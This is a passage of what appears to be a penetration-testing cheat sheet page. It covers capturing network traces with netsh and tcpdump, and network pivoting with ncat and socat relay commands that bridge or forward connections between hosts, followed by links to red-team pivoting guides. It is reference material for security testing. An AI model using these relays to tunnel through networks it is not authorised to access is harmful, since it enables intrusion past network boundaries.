+<h2 id="capture-a-network-trace-with-builtin-tools">Capture a network trace with builtin tools</h2>
+<ul>
+<li>Windows (netsh)
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c"># start a capture use the netsh command.</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">netsh</span> <span class="n">trace</span> <span class="nb">start </span><span class="n">capture</span><span class="p">=</span><span class="n">yes</span> <span class="n">report</span><span class="p">=</span><span class="n">disabled</span> <span class="n">tracefile</span><span class="p">=</span><span class="n">c</span><span class="p">:\</span><span class="n">trace</span><span class="p">.</span><span class="n">etl</span> <span class="n">maxsize</span><span class="p">=</span><span class="n">16384</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c"># stop the trace</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="n">netsh</span> <span class="n">trace</span> <span class="n">stop</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="c"># Event tracing can be also used across a reboots</span>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="n">netsh</span> <span class="n">trace</span> <span class="nb">start </span><span class="n">capture</span><span class="p">=</span><span class="n">yes</span> <span class="n">report</span><span class="p">=</span><span class="n">disabled</span> <span class="n">persistent</span><span class="p">=</span><span class="n">yes</span> <span class="n">tracefile</span><span class="p">=</span><span class="n">c</span><span class="p">:\</span><span class="n">trace</span><span class="p">.</span><span class="n">etl</span> <span class="n">maxsize</span><span class="p">=</span><span class="n">16384</span>
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="c"># To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.</span>
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="n">etl2pcapng</span><span class="p">.</span><span class="n">exe</span> <span class="n">c</span><span class="p">:\</span><span class="n">trace</span><span class="p">.</span><span class="n">etl</span> <span class="n">c</span><span class="p">:\</span><span class="n">trace</span><span class="p">.</span><span class="n">pcapng</span>
+<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>
+<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a><span class="c"># Use filters</span>
+<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a><span class="n">netsh</span> <span class="n">trace</span> <span class="nb">start </span><span class="n">capture</span><span class="p">=</span><span class="n">yes</span> <span class="n">report</span><span class="p">=</span><span class="n">disabled</span> <span class="n">Ethernet</span><span class="p">.</span><span class="n">Type</span><span class="p">=</span><span class="n">IPv4</span> <span class="n">IPv4</span><span class="p">.</span><span class="n">Address</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">200</span><span class="p">.</span><span class="n">200</span><span class="p">.</span><span class="n">3</span> <span class="n">tracefile</span><span class="p">=</span><span class="n">c</span><span class="p">:\</span><span class="n">trace</span><span class="p">.</span><span class="n">etl</span> <span class="n">maxsize</span><span class="p">=</span><span class="n">16384</span>
+</code></pre></div></li>
+<li>Linux (tcpdump)
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">sudo</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">tcpdump</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">tcpdump</span> <span class="n">-w</span> <span class="n">0001</span><span class="p">.</span><span class="n">pcap</span> <span class="n">-i</span> <span class="n">eth0</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="n">tcpdump</span> <span class="n">-A</span> <span class="n">-i</span> <span class="n">eth0</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="c"># capture every TCP packet</span>
+<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="n">tcpdump</span> <span class="n">-i</span> <span class="n">eth0</span> <span class="n">tcp</span>
+<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c"># capture everything on port 22</span>
+<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="n">tcpdump</span> <span class="n">-i</span> <span class="n">eth0</span> <span class="n">port</span> <span class="n">22</span>
+</code></pre></div></li>
+</ul>
+<h2 id="basic-pivoting-types">Basic Pivoting Types</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Type</th>
+<th style="text-align: left;">Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Listen - Listen</td>
+<td style="text-align: left;">Exposed asset, may not want to connect out.</td>
+</tr>
+<tr>
+<td style="text-align: left;">Listen - Connect</td>
+<td style="text-align: left;">Normal redirect.</td>
+</tr>
+<tr>
+<td style="text-align: left;">Connect - Connect</td>
+<td style="text-align: left;">Can’t bind, so connect to bridge two hosts</td>
+</tr>
+</tbody>
+</table>
+<h3 id="listen-listen">Listen - Listen</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Type</th>
+<th style="text-align: left;">Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">ncat</td>
+<td style="text-align: left;"><code>ncat -v -l -p 8080 -c "ncat -v -l -p 9090"</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">socat</td>
+<td style="text-align: left;"><code>socat -v tcp-listen:8080 tcp-listen:9090</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 1</td>
+<td style="text-align: left;"><code>ncat localhost 8080 &lt; file</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 2</td>
+<td style="text-align: left;"><code>ncat localhost 9090 &gt; newfile</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="listen-connect">Listen - Connect</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Type</th>
+<th style="text-align: left;">Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">ncat</td>
+<td style="text-align: left;"><code>ncat -l -v -p 8080 -c "ncat localhost 9090"</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">socat</td>
+<td style="text-align: left;"><code>socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 1</td>
+<td style="text-align: left;"><code>ncat localhost -p 8080 &lt; file</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 2</td>
+<td style="text-align: left;"><code>ncat -l -p 9090 &gt; newfile</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="connect-connect">Connect - Connect</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Type</th>
+<th style="text-align: left;">Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">ncat</td>
+<td style="text-align: left;"><code>ncat localhost 8080 -c "ncat localhost 9090"</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">socat</td>
+<td style="text-align: left;"><code>socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 1</td>
+<td style="text-align: left;"><code>ncat -l -p 8080 &lt; file</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">remote host 2</td>
+<td style="text-align: left;"><code>ncat -l -p 9090 &gt; newfile</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="http://woshub.com/port-forwarding-in-windows/">Port Forwarding in Windows - Windows OS Hub</a></li>
+<li><a href="https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences">Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin</a></li>
+<li><a href="https://artkond.com/2017/03/23/pivoting-guide/">A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko</a></li>
+<li><a href="https://www.information-security.fr/pivoting-meterpreter/">Pivoting Meterpreter</a></li>
+<li>🇫🇷 <a href="https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/">Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI</a> - 🇺🇸 <a href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/">Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI</a></li>
+<li><a href="https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49">Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8</a></li>
+<li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory">Active Directory - hideandsec</a></li>
+<li><a href="https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/">Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="March 14, 2025 14:33:05">March 14, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+  <div class="social-container">
+    <b>Share this content</b>
+    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+      <a class="a2a_button_x"></a>
+      <a class="a2a_button_telegram"></a>
+      <a class="a2a_button_linkedin"></a>
+      <a class="a2a_button_email"></a>
+      <a class="a2a_button_microsoft_teams"></a>
+    </div>
+    <br>
+    <script async src="https://static.addtoany.com/menu/page.js"></script>
+  </div>
+  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
